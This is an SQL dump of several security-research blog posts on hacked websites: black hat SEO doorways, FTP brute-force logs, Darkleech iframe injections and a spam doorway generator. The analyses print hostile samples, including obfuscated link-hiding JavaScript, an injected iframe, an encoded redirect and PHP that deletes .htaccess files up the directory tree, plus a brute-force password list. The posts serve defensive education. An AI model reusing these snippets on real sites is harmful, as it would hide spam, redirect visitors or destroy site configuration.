the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (9, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (10, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (11, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (12, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (13, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (14, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, 